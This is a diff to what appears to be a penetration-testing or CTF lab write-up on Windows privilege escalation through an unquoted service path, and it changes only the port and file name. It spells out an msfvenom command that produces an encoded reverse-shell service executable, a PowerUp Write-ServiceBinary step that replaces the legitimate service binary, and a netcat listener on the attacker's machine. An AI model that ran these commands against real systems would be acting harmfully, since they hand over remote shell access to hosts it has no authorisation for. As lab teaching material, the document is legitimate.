@@ -80,8 +80,8 @@ Check          : Unquoted Service Paths
 
 - The *PowerUp* scan results show that the service can be restarted, and the path can be edited
 - Generate shellcode to replace legitimate binary
-    - `msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine ip> LPORT=4562 -e x86/shikata_ga_nai -f exe-service -o s.exe`
 - Use the cmdlet listed in *AbuseFunction* section of the scan results to replace legitimate binary with malicious shellcode
     - `Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe"`
 - Set up listener on attacker machine
-    - `nc -lvnp 4443`
+    - `nc -lvnp 4562`
